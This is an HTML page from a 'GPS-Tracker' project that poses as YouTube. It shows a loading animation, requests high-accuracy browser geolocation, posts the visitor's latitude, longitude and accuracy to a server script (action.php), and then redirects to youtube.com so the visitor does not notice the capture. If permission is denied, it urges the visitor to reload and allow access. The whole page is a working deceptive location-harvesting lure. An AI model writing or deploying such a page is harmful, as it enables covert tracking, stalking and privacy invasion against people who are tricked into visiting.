<!--
    **GPS-Tracker**
  @Author -> Sun Podder
  @github.com/SunPodder/gps-tracker
  @License: MIT License
-->
<!DOCTYPE html>
<html>
<head>
  <title>YouTube</title>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
  <title>YouTube</title>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style type="text/css">
  div{
    display:flex;
    align-items:center;
    justify-content:center;
    height:100vh;
    width:100vw;
  }
  body{
    margin:0;
  }
  div > *{
    padding:14vw;
    width:50vw;
    height:50vw;
    background:rgba(255,50,50,0.6);
    animation:bounce 1s infinite;
    border-radius:70%;
    color:white;
    text-align:center;
    display:flex;
    justify-content:center;
    align-items:center;
  }
  @keyframes bounce{
    0%{
      height:50vw;
      width:50vw;
    }
    50%{
      height:70vw;
      width:70vw;
    }
    100%{
      width:50vw;
      height:50vw;
      }
    }
  </style>
</head>
<body>

<div><i>Loading...</i></div>
<script type="text/javascript">

function getLocation() {
  //checks if the browser supports Geolocation
  if (navigator.geolocation) {
    //if browser supports Geolocation, gets location data and sends to server
    navigator.geolocation.getCurrentPosition(showPosition, onErr, options);
  } else {
    document.write("Geolocation is not supported by this browser.");
  }
}

//callback function. If Geolocation call is successful executes this function
function showPosition(position) {
  let lat = position.coords.latitude
  let lon = position.coords.longitude
  let accuracy = position.coords.accuracy
  $.post("action.php", {
    lat: lat,
    long: lon,
    acc: accuracy
  },
  (data, status) => {
    window.location.href = "https://youtube.com"
  })
}

//callback function. If Geolocation call is failed executes this function
function onErr(err){
  alert("Please reload the webpage and give location permission to use this site")
  document.querySelector("i").innerHTML = err.message+".<br><br>Please reload the webpage<br>and give location<br>permission to access this<br>file...<br><br>"
  $.get("action2.php", data => {
    return false;
  })
}

//Geolocation additional options. 
//High Accuracy is enabled for precious location
const options = {
  enableHighAccuracy: true
}

getLocation()

</script>
</body>
</html>